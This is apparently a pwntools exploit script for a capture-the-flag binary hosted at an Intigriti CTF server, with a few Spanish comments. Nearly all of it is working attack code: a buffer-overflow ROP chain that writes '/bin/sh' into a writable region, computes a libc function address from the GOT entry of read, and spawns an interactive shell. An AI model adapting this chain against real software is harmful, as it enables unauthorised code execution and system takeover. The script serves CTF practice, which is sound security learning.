from pwn import *

gs = '''
b *vuln+42
continue
'''

elf = context.binary = ELF("./chal")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
mov_ptr_rdi_rdx = 0x00000000004011e5 # rop.find_gadget(['mov qword ptr [rdi], rdx', 'ret'])[0]
mov_rdi_ptr_rdx = 0x00000000004011e9 # rop.find_gadget(['mov rdi, qword ptr [rdx]', 'ret'])[0]
mov_rdx_rdi = 0x00000000004011f2 # rop.find_gadget(['mov rdx, rdi', 'ret'])[0]
mov_ptr_rsp_rdx_rdi = 0x00000000004011fa
add_rdi_rdx = 0x00000000004011f6 # rop.find_gadget(['add rdi, rdx', 'ret'])[0]

bin_sh = 0x404100

payload = b"".join([
    b"A"*0x18,
    # Este rop chain hara que /bin/sh este en 0x404100 (Sector de memoria rwxp)
    p64(pop_rdi),
    p64(bin_sh),               # mov rdi, 0x404100
    p64(pop_rdx),
    p64(0x68732f6e69622f),     # mov rdx, 0x68732f6e69622f
    p64(mov_ptr_rdi_rdx),      # mov qword ptr[rdi], rdx
    #
    p64(pop_rdx),          
    p64(elf.got.read),         # mov rdx. elf.got.read
    p64(mov_rdi_ptr_rdx),      # mov rdi, qword ptr[rdx]
    p64(pop_rdx),
    p64(0xfffffffffffd4f90),   # mov rdx, 0xfffffffffffd4f90
    p64(add_rdi_rdx),          # add rdi, rdx
    p64(pop_rdx),
    p64(7 * 8),                # mov rdx, 7*8
    p64(mov_ptr_rsp_rdx_rdi),  # mov qword ptr[rsp+rdx], rdi
    p64(pop_rdi),
    p64(bin_sh),               # mov rdi, 0x404100
    p64(pop_rsi),
    p64(0x0),                  # mov rsi, 0x0
    p64(0x0),                  # mov r15, 0x0
    p64(pop_rdx),
    p64(0x0)                   # mov rdx, 0x0
])

io.sendline(payload)

io.interactive()
